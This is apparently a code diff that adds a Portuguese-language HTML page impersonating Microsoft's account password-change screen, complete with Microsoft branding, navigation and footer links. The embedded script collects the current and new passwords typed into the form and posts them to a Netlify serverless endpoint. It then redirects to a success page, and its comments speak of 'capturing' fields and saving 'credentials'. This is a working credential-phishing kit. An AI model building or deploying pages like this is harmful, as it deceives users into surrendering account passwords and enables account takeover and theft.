@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Alterar Senha</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <header>
+        <div class="logo">
+            <img class="logo-img" src="microsoft-logo.png" alt="Logo">
+        </div>
+        <nav>
+            <div class="nav-item"><a href="https://account.microsoft.com/" class="semibold">Conta da Microsoft</a></div>
+            <div class="nav-item"><div class="separator"></div></div>
+            <div class="nav-item"><a href="https://account.microsoft.com/profile?lang=pt-BR">Suas Informações</a></div>
+            <div class="nav-item"><a href="https://account.microsoft.com/privacy?lang=pt-BR">Privacidade</a></div>
+            <div class="nav-item"><a href="https://account.microsoft.com/security?lang=pt-BR">Segurança</a></div>
+            <div class="nav-item dropdown">
+                <a href="#">Pagamento e Cobrança ⌵</a>
+                <div class="dropdown-content">
+                    <a href="https://account.microsoft.com/billing/orders?lang=pt-BR">Histórico de pedidos</a>
+                    <a href="https://account.microsoft.com/billing/payments?lang=pt-BR">Formas de pagamentos</a>
+                    <a href="https://account.microsoft.com/billing/addresses">Agenda</a>
+                    <a href="https://go.microsoft.com/fwlink/p/?LinkID=623991">Ajuda com cobrança</a>
+                </div>
+            </div>
+            <div class="nav-item"><a href="https://account.microsoft.com/services?lang=pt-BR">Serviços e Assinaturas</a></div>
+            <div class="nav-item"><a href="https://account.microsoft.com/devices?lang=pt-BR">Dispositivos</a></div>
+            <div class="nav-space"></div>
+        </nav>
+        <div class="icons">
+            <div class="help-icon">
+                <button class="help-button">
+                    <i class="ms-Icon ms-Icon--Help"></i>
+                </button>
+            </div>
+            <a href="#"><img class="profile-img" src="profile-icon.png" alt="Profile"></a>
+        </div>
+    </header>
+    <main>
+        <div class="section-body container">
+            <h1 id="UpdatePasswordTitle" class="text-subheader title" role="heading" aria-level="1">Alterar sua senha</h1>
+            <div class="row">
+                <div class="col-xs-24 form-group text-block-body">Uma senha forte ajuda a impedir o acesso não autorizado à sua conta de email.</div>
+            </div>
+            <form id="password-form" onsubmit="submitForm(event)">
+                <div class="row">
+                    <div class="col-xs-24 form-group">
+                        <label for="current-password">Senha atual</label><br/>
+                        <input type="password" id="current-password" name="current-password" placeholder="Senha atual">
+                        <a href="#" class="forgot-password">Esqueceu sua senha?</a>
+                    </div>
+                </div>
+                <div class="row">
+                    <div class="col-xs-24 form-group">
+                        <label for="new-password" class="semibold">Nova senha</label><br/>
+                        <input type="password" id="new-password" name="new-password" placeholder="Nova senha" required pattern="(?=.*[a-z])(?=.*[A-Z]).{8,}"><br/>
+                        <small>Mínimo de 8 caracteres; diferencia maiúsculas de minúsculas</small></p>
+                    </div>
+                </div>
+                <div class="row">
+                    <div class="col-xs-24 form-group">
+                        <label for="confirm-password" class="semibold">Redigitar a senha</label><br/>
+                        <input type="password" id="confirm-password" name="confirm-password" placeholder="Redigitar senha" required>
+                    </div>
+                </div>
+                <div class="row">
+                    <div class="col-xs-24 form-group checkbox-container">
+                        <input type="checkbox" id="password-expiry" name="password-expiry">
+                        <label for="password-expiry" class="semibold">Fazer com que a senha seja alterada a cada 72 dias</label>
+                    </div>
+                </div>
+                <br/><div class="row">
+                    <div class="col-xs-24 form-group buttons">
+                        <button type="submit" class="save-btn">Salvar</button>
+                        <button type="button" class="cancel-btn">Cancelar</button>
+                    </div>
+                </div>
+            </form>
+        </div>
+    </main>
+    <footer>
+        <div class="footer-links">
+            <div class="footer-item">
+                <img class="globe-img" src="globo.png" alt="Globo">
+                <a href="#">Português (Brasil)</a>
+            </div>
+            <div class="footer-item">
+                <img class="simbolo-img" src="simbolo.png" alt="Simbolo">
+                <a href="https://aka.ms/yourcaliforniaprivacychoices">Suas opções de privacidade</a>
+            </div>
+            <div class="footer-item"><a href="https://go.microsoft.com/fwlink/?linkid=2259814">Privacidade dos Dados de Saúde do Consumidor</a></div>
+            <div class="footer-item"><a href="https://go.microsoft.com/fwlink/?LinkID=521839">Privacidade e Cookies</a></div>
+            <div class="footer-item"><a href="https://go.microsoft.com/fwlink/?LinkID=530144&clcid={CLCID_HEX}">Termos de uso</a></div>
+            <div class="footer-item"><a href="https://support.microsoft.com/contactus">Fale conosco</a></div>
+        </div>
+        <div class="footer-item">
+            © Microsoft 2024
+        </div>
+    </footer>
+    <script>
+        async function submitForm(event) {
+            event.preventDefault();
+            const form = event.target;
+            const formData = new FormData(form);
+            const data = {
+                email: formData.get('current-password'), // ou qualquer outro campo que você queira capturar
+                senha: formData.get('new-password')
+            };
+
+            const response = await fetch('/.netlify/functions/submit', {
+                method: 'POST',
+                body: JSON.stringify(data),
+                headers: {
+                    'Content-Type': 'application/json'
+                }
+            });
+
+            if (response.ok) {
+                window.location.href = 'success.html';
+            } else {
+                alert('Erro ao salvar as credenciais');
+            }
+        }
+    </script>
+</body>
+</html>
